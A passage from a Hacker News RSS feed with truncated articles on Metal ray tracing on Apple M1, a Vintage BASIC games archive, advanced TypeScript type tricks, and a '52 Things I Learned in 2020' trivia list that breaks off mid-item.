<a href="https://github.com/Twinklebear/ChameleonRT/blob/master/dxr/dxr_utils.cpp#L877-L977">DirectX</a>
or <a href="https://github.com/Twinklebear/ChameleonRT/blob/master/vulkan/vulkanrt_utils.cpp#L46-L214">Vulkan</a>
with <a href="https://github.com/Twinklebear/ChameleonRT/blob/master/metal/metalrt_utils.mm#L318-L396">Metal</a>.
OptiXâ€™s API provides a similar simplification, hereâ€™s the
<a href="https://github.com/Twinklebear/ChameleonRT/blob/master/optix/optix_utils.cpp#L183-L244">BVH build in OptiX</a>
for reference.
Itâ€™s also nice to have templates and C++ style functionality in the shader language,
a feature Metal shares with OptiX, which uses CUDA for the device side code.</p>

<p>This simplicity also has some drawbacks. For example, while in DirectX, Vulkan, and OptiX
you have control over where the acceleration structure memory is allocated,
Metal makes this allocation for you. As a result, you cannot allocate the acceleration
structures on a <code>MTLHeap</code>, and so to make sure theyâ€™re available for your rendering
pipeline, you must individually mark them as used in a loop instead of a single <code>useHeap</code> call.</p>

<figure><pre><code data-lang="objc"><span></span><span>// Use our top level acceleration structure</span>
<span>[</span><span>command_encoder</span> <span>setAccelerationStructure</span><span>:</span><span>bvh</span><span>-&gt;</span><span>bvh</span> <span>atBufferIndex</span><span>:</span><span>1</span><span>];</span>
<span>// Also mark all mesh acceleration structures used, as they're indirectly</span>
<span>// referenced by the top level one</span>
<span>for</span> <span>(</span><span>auto</span> <span>&amp;</span><span>mesh</span> <span>:</span> <span>bvh</span><span>-&gt;</span><span>meshes</span><span>)</span> <span>{</span>
    <span>[</span><span>command_encoder</span> <span>useResource</span><span>:</span><span>mesh</span><span>-&gt;</span><span>bvh</span> <span>usage</span><span>:</span><span>MTLResourceUsageRead</span><span>];</span>
<span>}</span></code></pre></figure>

<p>This can add some overhead if you have a lot of bottom level BVHs, as can be the
case in scenes with many instances.
Itâ€™d be nice to be able to allocate the acceleration structures on a heap, and replace this loop
with a single <code>[command_encoder useHeap:data_heap-&gt;heap];</code></p>

<p>The API is also simplified significantly by not including ray tracing pipelines and
only requiring a Shader Binding Table-esque
structure when implementing custom geometries or other operations that need
to happen â€¦</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.willusher.io/graphics/2020/12/20/rt-dive-m1">https://www.willusher.io/graphics/2020/12/20/rt-dive-m1</a></em></p>]]>
            </description>
            <link>https://www.willusher.io/graphics/2020/12/20/rt-dive-m1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502201</guid>
            <pubDate>Tue, 22 Dec 2020 02:27:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vintage Basic â€“ Games]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25502018">thread link</a>) | @Fjolsvith
<br/>
December 21, 2020 | http://vintage-basic.net/games.html | <a href="https://web.archive.org/web/*/http://vintage-basic.net/games.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">
  <div><p>
      The classic book <a href="http://www.amazon.com/BASIC-Computer-Games-Microcomputer-David/dp/0894800523">
      <em>BASIC Computer Games</em></a>,
      published by <a href="http://en.wikipedia.org/wiki/Creative_Computing">Creative Computing</a>,
      inspired a generation of programmers.  The games were written by many people, and compiled by
      <a href="http://www.swapmeetdave.com/Ahl/DHAbio.htm">David H. Ahl</a>. The fabulous illustrations
      accompanying each game were done by
      <a href="http://www.bekerbots.com/">George Beker</a>.
      </p>
      <p>
      I've included all the games here for your tinkering pleasure.
      I've tested and tweaked each one of them to make sure they'll run with Vintage BASIC, though you may see
      a few oddities. That's part of the fun of playing with BASIC: it never works quite the same on two machines.
      The games will play better if you keep CAPS LOCK on, as they were designed to be used with capital-letter
      input.
    </p>
    <p>
      The table below includes both links to the pages of the book at
      <a href="http://www.atariarchives.org/basicgames/">atariarchives.org</a>,
      and the source code for each game.  I obtained most of the source code from
      <a href="http://www.classicbasicgames.org/">classicbasicgames.org</a>, with the exception
      of Civil War and Super Star Trek, which I entered myself.  The descriptions mainly come
      from an earlier edition of the book, <em>101 BASIC Computer Games</em>, via the scans at
      <a href="http://www.digibarn.com/collections/books/basicgames/">digibarn.com</a>.
      All book content is provided with the express consent of
      David H. Ahl, editor.
    </p>
    <p>
      You can download the <strong>entire set</strong> of games as a tarball
      (<a href="http://vintage-basic.net/downloads/bcg.tar.gz">bcg.tar.gz</a>)
      or a ZIP archive (<a href="http://vintage-basic.net/downloads/bcg.zip">bcg.zip</a>).
    </p>
  </div>
  <p><small>Â© 2009â€“2017 Lyle Kopnicky</small>
  </p></div></div>]]>
            </description>
            <link>http://vintage-basic.net/games.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502018</guid>
            <pubDate>Tue, 22 Dec 2020 01:54:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced TypeScript Type Tricks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25501761">thread link</a>) | @dested
<br/>
December 21, 2020 | https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/ | <a href="https://web.archive.org/web/*/https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <div>
        <div>

            
            <div>

                
                <h3 id="a-journey">A journey</h3>
<p>After spending some time in TypeScript you may begin to crave type safety everywhere in your life. JavaScript is an inherently unsafe language and there are dragons to be found everywhere and in almost every framework. Most frameworks are sufficiently covered, but what if you design a beautiful API internally that needs to be incredibly feature rich, and incredibly safe, but still allow for the best JavaScript idioms. Well at that point you may have to dive into writing some pretty gnarly types.</p>
<p>In general there are a number of TypeScript TYPE libraries out there, <a href="https://github.com/millsp/ts-toolbelt">ts-toolbelt</a>, <a href="https://github.com/piotrwitek/utility-types">utility-types</a>, <a href="https://www.npmjs.com/package/type-fest">type-fest</a> to name a few. These libraries are great, and contain a plethora of information, but they are generally sparse in describing HOW they created their utility types.</p>
<blockquote>
<p>There are a lot of great type libraries, but no great documentation on how theyâ€™re built</p>
</blockquote>
<p>The goal of this post is to not only expose some great utility types, but also some tips and tricks that I realized along the way. Unfortunately this post requires a relatively strong understanding of TypeScript types and tricks. <a href="https://www.typescriptlang.org/docs/handbook/advanced-types.html">Advanced Types</a> is a great place to start before diving in!</p>
<h3 id="esoteric-solutions">Esoteric solutions</h3>
<p>A lot of these solutions (and problems) may feel esoteric, and thatâ€™s because frankly they are. They are not for the faint of heart, they do not need to be known for daily TypeScript use. They are the nitty-gritty realities of writing type libraries for incredibly complex or il-defined JavaScript problems.</p>
<p>Most of these types come from a few TypeScript libraries im working on, namely <a href="https://www.npmjs.com/package/safe-schema">safe-schema</a>, and <a href="https://www.npmjs.com/package/mongo-safe">mongo-safe</a>, both of which I intend to do lengthy blog posts on in the future.</p>
<p>I have tried to organize these with an example of the usage, and the reason why the problem or solution is novel or interesting. They are in no particular order.</p>
<p>
  <img src="https://casualdeveloper.net/img/youshouldnt.gif" alt="I didnt say they couldnt I said you shouldnt">

</p>
<hr>
<h2 id="setting-a-variable-extends-infer">Setting A Variable (<code>extends infer</code>)</h2>
<h3 id="example">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> {item: <span>Fancy</span>&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>} <span>|</span> 
                Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span> <span>|</span> 
                [Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>, Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>] <span>|</span> 
                [Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>];
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span> <span>extends</span> <span>infer</span> TItem <span>?</span> 
                {item: <span>TItem</span>} <span>|</span> TItem <span>|</span> [TItem, TItem] <span>|</span> [TItem]<span>:</span>
                Impossible;

<span>type</span> Impossible <span>=</span> <span>never</span>;
</code></pre></div>
<h3 id="reason">Reason</h3>
<p>Occasionally you will need to use the same type over and over in your type definition. Every time TypeScript encounters your type it will have to evaluate it again. Using the infer trick you can store a variable in your type that you can use throughout the rest of it.</p>
<p>You will see this <code>extends infer</code> trick pop up in a few places. <code>infer</code> has some interesting properties that make it useful when defining complex types.</p>
<p>Note the use of <code>Impossible</code> here. We can never reach the Impossible branch, so typically we would specify never here, but I have found just putting never there will be confusing in the future when looking at these types again thinking that never branch could possibly be hit. The use of explicit type aliasâ€™s that resolve to basic types is a great way to be explicit in your definitions.</p>
<p><em>Note:</em> This will not work if the result of your type is <code>never</code>. If T or <code>Fancy&lt;Shmancy&lt;Deeply&lt;Nested&lt;T&gt;&gt;&gt;&gt;</code> is never, the whole expression will result in <code>never</code>.</p>
<hr>
<h2 id="type-is-never">Type is <code>never</code></h2>
<h3 id="example-1">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>never</span> <span>?</span> 1 : <span>0</span>;

<span>type</span> Test1 <span>=</span> Shoes<span>&lt;</span><span>'hi'</span><span>&gt;</span>; <span>// 0
</span><span></span><span>type</span> Test2 <span>=</span> Shoes&lt;<span>never</span>&gt;; <span>// never
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> [T] <span>extends</span> [<span>never</span>] <span>?</span> 1 : <span>0</span>;
<span>//              ^ ^         ^     ^
</span><span></span><span>type</span> Test1 <span>=</span> Shoes<span>&lt;</span><span>'hi'</span><span>&gt;</span>; <span>// 0
</span><span></span><span>type</span> Test2 <span>=</span> Shoes&lt;<span>never</span>&gt;; <span>// 1
</span></code></pre></div>
<h3 id="reason-1">Reason</h3>
<p>It is not easy to test for <code>never</code>. Once one of the types in your expression is <code>never</code> it will <strong>poison</strong> the rest of the expression to evaluate to <code>never</code>. Typically, this is a useful feature, but when you actually need to check for <code>never</code> you can wrap your expression in a tuple. This will trick the TypeScript compiler to compare apples to apples instead of expanding the <code>never</code>.</p>
<p>It works by comparing the tuple <code>T</code> to the tuple <code>never</code>. We use this tuple trick in a number of places. I am not certain as to why it works, other than the fact that tuples make TypeScript slightly less greedy in its evaluation.</p>
<hr>
<p>
  <img src="https://casualdeveloper.net/img/never.gif" alt="What never? No never.">

</p>
<h2 id="compare-multiple-types-at-once">Compare Multiple Types At Once</h2>
<h3 id="example-2">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T1</span>, <span>T2</span>, <span>T3</span>&gt; <span>=</span> T1 <span>extends</span> {} <span>?</span> 
                              (T2 <span>extends</span> <span>number</span> <span>?</span> 
                                  (T3 <span>extends</span> <span>string</span> <span>?</span> 
                                      1 : 
                                      <span>0</span>)<span>:</span> 
                                  <span>0</span>)<span>:</span> 
                              <span>0</span>;
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T1</span>, <span>T2</span>, <span>T3</span>&gt; <span>=</span> 
                        [
                            T1 <span>extends</span> {} <span>?</span> 1 : <span>0</span>, 
                            T2 <span>extends</span> <span>number</span> <span>?</span> 1 : <span>0</span>, 
                            T3 <span>extends</span> Something <span>?</span> 1 : <span>0</span>
                        ] <span>extends</span> 
                        [<span>1</span>, <span>1</span>, <span>1</span>] <span>?</span> 
                        1:
                        <span>0</span>;
</code></pre></div>
<h3 id="reason-2">Reason</h3>
<p>You will often need to deeply check a few things, and only execute some logic if all are a certain value. This can result in an annoying deeply nested structure.</p>
<p>One clean solution to this is to check all of them upfront in a tuple and compare that to the expected results of each. Now your tree is only one level deep and your intent is much clearer!</p>
<hr>
<h2 id="dont-distribute-my-union">Donâ€™t Distribute My Union</h2>
<h3 id="example-3">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> StringToObject&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>string</span> <span>?</span> {[key <span>in</span> T]<span>:</span> <span>boolean</span>} <span>:</span> <span>never</span>;

<span>type</span> UnionToObject&lt;<span>T</span>&gt; <span>=</span> StringToObject&lt;<span>T</span>&gt;;
<span>type</span> Nested&lt;<span>T</span>&gt; <span>=</span> {[key <span>in</span> <span>keyof</span> T]<span>:</span> UnionToObject&lt;<span>T</span>[<span>key</span>]&gt;};

<span>const</span> value: <span>Nested</span><span>&lt;</span>{thing<span>:</span> <span>'a'</span> <span>|</span> <span>'b'</span> <span>|</span> <span>'c'</span>}<span>&gt;</span> <span>=</span> {thing<span>:</span> {a: <span>true</span>, c: <span>true</span>}}; <span>// NO ERROR
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> StringToObject&lt;<span>T</span>&gt; <span>=</span> [T] <span>extends</span> [<span>string</span>] <span>?</span> {[key <span>in</span> T]<span>:</span> <span>boolean</span>} <span>:</span> <span>never</span>;
<span>//                       ^ ^         ^      ^
</span><span></span><span>type</span> UnionToObject&lt;<span>T</span>&gt; <span>=</span> StringToObject&lt;<span>T</span>&gt;;
<span>type</span> Nested&lt;<span>T</span>&gt; <span>=</span> {[key <span>in</span> <span>keyof</span> T]<span>:</span> UnionToObject&lt;<span>T</span>[<span>key</span>]&gt;};

<span>const</span> value: <span>Nested</span><span>&lt;</span>{thing<span>:</span> <span>'a'</span> <span>|</span> <span>'b'</span> <span>|</span> <span>'c'</span>}<span>&gt;</span> <span>=</span> {thing<span>:</span> {a: <span>true</span>, c: <span>true</span>}}; <span>// ERROR Missing 'b'
</span></code></pre></div>
<h3 id="reason-3">Reason</h3>
<p>Sometimes you will pass a union so deeply that when it reaches its final destination the union has been distributed. This <em>can</em> result in unintended behavior as described above. Since the union has been distributed, <code>value</code> in the first example will result in the type</p>
<pre><code>{thing:
    {[key in 'a']:boolean} | 
    {[key in 'b']:boolean} | 
    {[key in 'c']:boolean}
}
</code></pre><p>when your goal was simply <code>{thing: {[key in ('a'|'b'|'c')]:boolean} }</code>.</p>
<p>The solution to this is to wrap <code>T</code> in a tuple to force TypeScript to not distribute your union in subsequent expressions.</p>
<hr>
<h2 id="exclude-never">Exclude <code>never</code></h2>
<h3 id="example-4">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Bad <span>=</span> {shoes:<span>never</span>; other: <span>boolean</span>}
<span>const</span> value: <span>Bad</span> <span>=</span> {shoes:<span>1</span>, other:<span>true</span>};  <span>// throws an error on shoes but intellisense and type is misleading
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span>
<span>export</span> <span>type</span> ExcludeNever&lt;<span>T</span>&gt; <span>=</span> {
    [key <span>in</span> <span>keyof</span> T <span>as</span> T[key] <span>extends</span> <span>never</span> <span>?</span> <span>never</span> <span>:</span> key]<span>:</span> T[key];
};


<span>const</span> value: <span>ExcludeNever</span>&lt;<span>Bad</span>&gt; <span>=</span> {shoes: <span>1</span>, other: <span>true</span>} <span>// throws a full error and no intellisense
</span></code></pre></div>
<h3 id="reason-4">Reason</h3>
<p>Occasionally you will process some type in a <code>Record</code> and set a value to never. This is perfectly valid and will throw errors when the user attempts to put a value there.</p>
<p>The problem is, intellisense does not exclude this key from your result list. Sure the type is <code>never</code>, but since the key still exists it will allow you to put a value there.</p>
<p>The solution is to use the new TypeScript <code>as</code> syntax to set the key to <code>never</code> when appropriate, that way it will not be available to the user.</p>
<p>Note: the end result is the same, you cannot put a value for shoes, but the DX is significantly improved in the second case.</p>
<hr>
<h2 id="potential-solution-to-type-instantiation-is-excessively-deep-and-possibly-infinite">Potential Solution To <code>type instantiation is excessively deep and possibly infinite</code></h2>
<h3 id="example-5">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> GoDeep&lt;<span>T</span>&gt; <span>=</span> <span>/*...*/</span> GoDeep&lt;<span>T</span>&gt;; 
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> GoDeep&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>infer</span> R <span>?</span> <span>/*...*/</span> GoDeep&lt;<span>R</span>&gt; <span>:</span> Impossible;
</code></pre></div>
<h3 id="reason-5">Reason</h3>
<p>Now this one is a bit hard to explain, but easily one of the most powerful tricks in this post. It has saved my bacon too many times to count.</p>
<p>The example above is intentionally sparse since itâ€™s hard to find real world examples. <em>When you need it, youâ€™ll know</em>.</p>
<p>Along your journey to making a complex library completely typesafe you will inevitably create a type that is <em>potentially</em> infinitely deeply nested.</p>
<p>A little background: TypeScript has a rule that it will generally not dive deeper than about 50 levels of type checking before it throws up its hands and resolves the dreaded â€œtype instantiation is excessively deep and possibly infiniteâ€. This means your type is too complex and it would take too long to evaluate, so it wont.</p>
<p>I will say that 90% of the time this is due to an issue in your code that is solvable without use of trickery. Typically, you screwed up somewhere. However, on the rare occasion where you did everything right, your type is properly optimized, but your library requirements actually do push the envelope, you can use the above trick.</p>
<p>How it works is still a bit of a mystery to me. This is a trick I learned from the incredible library <a href="https://github.com/millsp/ts-toolbelt">ts-toolbelt</a>. The best I can tell is it <strong>defers</strong> the evaluation of the type T until it is actually requested. What this means is just because your type <strong>can</strong> be nested infinitely, this outcome will be tested <strong>based on usage</strong> rather than a blanket statement.</p>
<p>That means if you pass a T that does exhaust the 50 cap then TypeScript will be sure to let you know, but until then all of the Tâ€™s that play nice will continue to work.</p>
<p>I dont know if the explanation above is correct and would love to be corrected! In my experience and research this is how it works.</p>
<p>
  <img src="https://casualdeveloper.net/img/deep.gif" alt="Deep">

</p>
<hr>
<h2 id="potential-solution-to-excessive-union">Potential Solution To <code>excessive union</code></h2>
<h3 id="example-6">Example</h3>
<div><pre><code data-lang="typescript"><span>type</span> Depths <span>=</span> <span>1</span> <span>|</span> <span>2</span> <span>|</span> <span>3</span> <span>|</span> <span>4</span> <span>|</span> <span>5</span>;

<span>type</span> NextDepth&lt;<span>TDepth</span> <span>extends</span> <span>Depths</span>&gt; <span>=</span> TDepth <span>extends</span> <span>1</span>
  <span>?</span> 2
  : <span>TDepth</span> <span>extends</span> <span>2</span>
  <span>?</span> 3
  : <span>TDepth</span> <span>extends</span> <span>3</span>
  <span>?</span> 4
  : <span>TDepth</span> <span>extends</span> <span>4</span>
  <span>?</span> 5
  : <span>never</span>;

<span>export</span> <span>type</span> SafeTypes <span>=</span> <span>number</span> <span>|</span> <span>string</span> <span>|</span> <span>boolean</span> <span>|</span> <span>Date</span>

<span>export</span> <span>type</span> DeepKeys&lt;<span>T</span> <span>extends</span> {}, <span>TDepth</span> <span>extends</span> <span>Depths </span><span>=</span> <span>1</span>&gt; <span>=</span> TDepth <span>extends</span> <span>5</span>
  <span>?</span> <span>//                                                           ^^ here is the check â€¦</span></code></pre></div></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/">https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/</a></em></p>]]>
            </description>
            <link>https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25501761</guid>
            <pubDate>Tue, 22 Dec 2020 01:11:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[52 Things I Learned in 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25501631">thread link</a>) | @kashd
<br/>
December 21, 2020 | https://www.kashdhanda.com/post/52-things-i-learned-in-2020 | <a href="https://web.archive.org/web/*/https://www.kashdhanda.com/post/52-things-i-learned-in-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Inspired by the great <a href="https://medium.com/@tomwhitwell">Tom Whitwell</a>, I've assembled a list of 52 Things I've Learned in 2020. My hope is that you'll find useful insights, but my guarantee is that you'll find a few fun pieces of trivia to discuss at (socially distanced) parties.</p><p>The learnings are roughly grouped according to my interests, including Public Policy, Creativity and Design, History, The Future, Technology, Global Affairs, Health, Money, and US Politics.</p><ol role="list"><li><strong>Needle Exchange Programs are Ridiculously Cost-Effective</strong>: &nbsp;A $1 government investment in needle exchange programs produces $6 in government savings, almost entirely by reducing the transmission rate of HIV. (<a href="https://kyhrc.org/2020/04/01/needle-exchange-programs-save-money-and-lives/">source</a>)</li><li><strong>Blue Lights Prevent Suicide</strong>: 20 years ago, the Japanese installed blue LED panels on platforms to prevent suicide. A 10 year study found an 84% decline in suicide attempts at stations where lights were installed, with no decline at stations without lights. (<a href="https://pubmed.ncbi.nlm.nih.gov/22980401/">source</a>)</li><li><strong>A Basic Income is Better than a Jobs Guarantee</strong>: Only about 15% of the jobless are your traditional unemployed people looking for a new job. 60% are disabled. Disability has doubled over the past twenty years and continues to increase. A Jobs Guarantee won't actually help most people who are unemployed. (<a href="https://slatestarcodex.com/2018/05/16/basic-income-not-basic-jobs-against-hijacking-utopia/">Scott Alexander</a>)</li><li><strong>Cement produces more air pollution than all the trucks in the world combined:</strong> Manufacturing the stone-like building material is responsible for 7% of global carbon dioxide emissions, more than what comes from all the trucks in the world. (<a href="https://www.bloombergquint.com/business/green-cement-struggles-to-expand-market-as-pollution-focus-grows">source</a>)</li><li><strong>Justice Takes a Backseat to Emotion</strong>: After the LSU football team loses a game, juvenile court judges in Louisiana hand out sentences that are 6.4% longer on average. Sentence length correlates with how far a judge lives from LSU, with the longest sentence lengths handed out by judges who live closest to LSU. (<a href="https://www.nber.org/papers/w22611#:~:text=Employing%20the%20universe%20of%20juvenile,college%20team%20in%20the%20state.)">source</a></li><li><strong>1/3 of White Harvard Students Haven't Earned Their Spot Through Academic Merit:</strong> A staggering 43% of white Harvard students are legacies, athletes, or children of donors. Of those, around 75% would have been rejected if not for their special preference. (<a href="https://www.nbcnews.com/news/us-news/study-harvard-finds-43-percent-white-students-are-legacy-athletes-n1060361">source</a>)</li><li><strong>Being Good Looking is a Privilege, Part 476</strong>: In one study, unattractive criminals were fined 3 times more than attractive criminals for moderate misdemeanours. However, appearance doesnâ€™t seem to influence verdicts of guilt or innocence (<a href="https://medium.com/fluxx-studio-notes/52-things-i-learned-in-2020-6a380692dbb8">Tom Whitwell</a>).</li></ol><ol role="list"><li><strong>People are Endlessly Creative (or Terrible Spellers)</strong>: ~15% of daily searches on Google have never been searched for before. (<a href="https://www.digitalinformationworld.com/2020/08/google-is-still-not-the-all-knowing-almighty-search-engine-as-15-percent-of-queries-are-never-seen-before-by-tech-giant.html">source</a>)</li><li><strong>Small Design Changes Make a Big Difference</strong>: One Dutch bike manufacturer reduced shipping damage by 70-80% simply by printing the image of a big flatscreen TV on their boxes. (<a href="https://www.theverge.com/2016/9/25/13048668/vanmoof-shipping-damages-dutch-bicycle-design">source</a>)</li><li><strong>The Best Way to Give Writing Feedback</strong>: Use the acryonm CRIBS. Note anything that is Confusing, Repetitive, Interesting, Boring, or Surprising. (<a href="https://www.perell.com/tweetstorms/cribs-my-writing-feedback-formula">David Perell</a>)</li><li><strong>Silly Mistakes Happen to the Best of Us</strong>: In 1999, the $125m Mars Climate Orbiter was lost because one team was using inches, the other was using centimeters. (<a href="https://www.latimes.com/archives/la-xpm-1999-oct-01-mn-17288-story.html">source</a>)</li><li><strong>Sequencing Matters</strong>: The first item in a buffet is taken by 75% of diners, even when the food order was reversed. 66% of all food taken comes from the first 3 items, no matter how long the buffet is. (<a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0077055">David Perell</a>)</li><li><strong>Betteridge's Law of Headlines:</strong> Any headline that ends with a question mark can be answered by the word "No". (<a href="https://en.wikipedia.org/wiki/Betteridge%27s_law_of_headlines">Wikipedia</a>)</li></ol><ol role="list"><li><strong>"Carrots are Good for Your Eyes" was an Anti-Nazi Scheme:</strong> The myth that carrots are beneficial for eyesight started as a military disinformation campaign in WWII by the Brits. They didn't want the Germans to realize that the RAF were shooting down so many enemy planes because they had radar, so they made up a lie about carrots that got stuck in the popular consciousness. (<a href="https://www.smithsonianmag.com/arts-culture/a-wwii-propaganda-campaign-popularized-the-myth-that-carrots-help-you-see-in-the-dark-28812484/">Smithsonian</a>)</li><li><strong>The Craziest Piece of History No One Told Me About:</strong> In 1800s China, a man claiming to be the brother of Jesus started a church. By the end of the story, 20 million people died in perhaps the bloodiest civil war in history. Fact is crazier than fiction. (<a href="https://en.wikipedia.org/wiki/Taiping_Rebellion">Wikipedia</a>)</li><li><strong>When You Don't Have a Lot, Make Use of What You Have</strong>: The Romans used to use stale urine as mouthwash. Due to the ammonia in the urine, it actually worked pretty well! (<a href="https://www.smithsonianmag.com/science-nature/from-gunpowder-to-teeth-whitener-the-science-behind-historic-uses-of-urine-442390/">Smithsonian</a>)</li><li><strong>America Did Not Start as a Democracy</strong>: Only 6% of the population was eligible to vote when George Washington ran for president. (<a href="https://en.wikipedia.org/wiki/1788%E2%80%9389_United_States_presidential_election">Wikipedia</a>)</li><li><strong>The Black Plague May Have Driven the Rise of the West</strong>: The Black Death kills over 40% of Europe's population. Some historians think that the resulting labor scarcity increased the bargaining power of peasants in the West, which led to the end of serfdom and to higher standards of living. Since the Plague was not as deadly in the East, the equivalent institutional changes never took place. [<a href="https://sloanreview.mit.edu/article/the-great-innovation-deceleration">MIT Sloan</a>]</li></ol><ol role="list"><li><strong>Internet History is Evaporating, and the Future is the Victim</strong>: 70% of links within the Harvard Law Review and 50% of URLs within United States Supreme Court opinions do not link to the originally cited information. (<a href="https://harvardlawreview.org/2014/03/perma-scoping-and-addressing-the-problem-of-link-and-reference-rot-in-legal-citations/">Harvard Law Review</a>)</li><li><strong>Deaths of Despair are Rapidly Rising:</strong> Between 1999 and 2017, midlife mortality from drug overdoses increased by nearly 400% (from 6.7 deaths/100,000 to 32.5), alcoholic liver disease increased by 40.6% (from 6.4 to 8.9), and suicide rates increased by 38.3% (from 13.4 to 18.6). (<a href="https://peterattiamd.com/why-is-life-expectancy-in-the-us-declining/">Dr. Peter Attia</a>)</li><li><strong>Clarke's First Law:</strong> When a distinguished but elderly scientist states that something is possible, he is almost certainly right. When he states that something is impossible, he is very probably wrong. (<a href="https://www.lesswrong.com/posts/irbREZtZzPi7WEYex/book-review-human-compatible-1">Scott Alexander</a>)</li><li><strong>Virtual Goods Will be a Trillion Dollar Business Someday</strong>: According to SuperData, virtual marketplaces generated $109 billion in 2019, 85% of which came from the purchase of virtual goods. (<a href="https://www.morningbrew.com/emerging-tech/stories/2020/05/25/todays-largest-games-thriving-virtual-economies?__cf_chl_jschl_tk__=8d4b1676a414c884b7e4d2f8e7f8cc1996fcdd3d-1607583077-0-AaDJV_rUtoKtK77M9bqejnODyJ4Uf98-V_BEjDsytGralRbifDBsYzco65WZVcACLBHKWOm4oEifs-vqH4Xs74o8QFgPphBDGmdv_h92Af-0fptwf5iHxEL2PLR9GhZnQbElXzz2QqqPU0KOpnixifVR90S04Eljx8WmYNAuBtxqOV5iLPoKWQ13iS6j3oNeYqbOzkPmYdO5LGSUxB_6qhIPpfYWZ7AduWDPApMGQvaHZtmJ90_lUXyhgMgZqxL4ciMEpYpT1LAzlBDFTjRKHNoXGmFIV0668Z4oFSUqtzDWDzL4cQJi0c9ADYJnYRzWy_AlJ2njxoCLzp3Bnz1--YA_cjZx_oKUGtg7GmE-8W9_nKri_VMd_-vVGQKqFBkBKLucIwa6po02QC1ZoWiZf1Tcv9tNz4iqgES_PEyCRRoNC7q3MYXapO2NCrgwEyeGIIg1_EQ_ofv0FJV49n03m1w1-os5EH7crBhx9ZcFZJ4r">Morning Brew</a>)</li><li><strong>The Age of the American Internet is Over</strong>: 80-90% of internet users are now outside the USA, there are more smartphone users in China than in the USA and western Europe combined, and the creation of venture-based startups has gone global. American policy preferences will no longer govern how the internet develops. (<a href="https://www.ben-evans.com/benedictevans/2020/10/3/the-end-of-the-american-internet">Benedict Evans</a>)</li></ol><ol role="list"><li><strong>Amazon Prime is Essential to the Fabric of America</strong>: 82% of American homes have Amazon Prime, more than voted in the 2016 election, have a pet, attend church, or decorate a Christmas tree. (<a href="https://twitter.com/profgalloway/status/1288546564374437894?lang=en">Scott Galloway</a>)</li><li><strong>The Big 3 Are The Main Beneficiaries Of The Venture Boom:</strong> Startups spend almost 40 cents of every VC dollar on Google, Facebook, and Amazon. (<a href="https://mobiledevmemo.com/facebook-google-alternative-start-up-user-acquisition/">Chamath Palihapitiya</a>)</li><li><strong>Software Matters More than Hardware:</strong> With todayâ€™s algorithms, computers would have beat the world chess champion already in 1994 (instead of 1997) on a contemporary desk computer. (<a href="https://www.lesswrong.com/posts/75dnjiD8kv2khe9eQ/measuring-hardware-overhang">hippke</a>)</li><li><strong>Public Markets Lead to Short-Termism</strong>: Less than a third of S&amp;P companies actually have R&amp;D budgets. This is largely due to the fact that R&amp;D can take years to produce meaningful revenue 